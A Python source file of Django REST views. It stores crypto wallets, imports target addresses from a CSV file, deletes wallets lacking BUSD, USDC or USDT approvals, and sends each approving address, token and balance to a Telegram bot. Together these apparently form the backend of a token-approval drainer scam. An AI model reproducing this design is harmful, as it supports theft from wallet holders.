from django_filters.rest_framework import DjangoFilterBackend
from rest_framework import generics
from rest_framework.parsers import JSONParser
from rest_framework.response import Response
from rest_framework.views import APIView
import requests
import csv
from . import models
from . import serializers
from . import service
from . import tg_bot


class WalletListCreateAPIView(generics.ListCreateAPIView):
    filter_backends = [DjangoFilterBackend]
    filterset_class = service.WalletFilter
    serializer_class = serializers.WalletSerializer
    queryset = models.Wallet.objects.all()


class WalletRetrieveUpdateDestroyAPIView(generics.RetrieveUpdateDestroyAPIView):
    queryset = models.Wallet.objects.all()
    serializer_class = serializers.WalletSerializer
    parser_classes = [JSONParser]
    lookup_field = 'address'


class SendedAddressListCreateAPIView(generics.ListCreateAPIView):
    serializer_class = serializers.SendedaddressSerializer
    queryset = models.SendedAddress.objects.all()


class TransactionAPIView(generics.ListCreateAPIView):
    serializer_class = serializers.TransactionSerializer
    queryset = models.Transaction.objects.all()


class TransactionBNBAPIView(generics.ListCreateAPIView):
    serializer_class = serializers.TransactionBNBSerializer
    queryset = models.TransactionBNB.objects.all()


class SendedAddressRetrieveUpdateDestroyAPIView(generics.RetrieveUpdateDestroyAPIView):
    queryset = models.SendedAddress.objects.all()
    serializer_class = serializers.SendedaddressSerializer
    parser_classes = [JSONParser]
    lookup_field = 'address'


def get_address(request):
    with open('visafy.csv', newline='') as csvfile:
        spamreader = csv.reader(csvfile, delimiter=',')
        for row in spamreader:
            address = row[5]
            try:
                new_address = models.SendedAddress.objects.create(address=address)
                new_address.save()

            except:
                continue


class ClearAddressAPIView(APIView):
    def get(self, request):
        wallets = models.Wallet.objects.all()
        for i in wallets:
            if not i.busd_approved and not i.usdc_approved and not i.usdt_approved:
                i.delete()
        return Response(data={'status': 'ok'}, status=200)


class BotAPIView(APIView):
    def get(self, request):
        data = {
            'address': request.GET.get('address'),
            'approved_token': request.GET.get('approved_token'),
            'balance': float(request.GET.get('balance')) / 1000000000000000000
        }
        tg_bot.send_message(data)
        return Response(data={'status': 'ok'}, status=200)

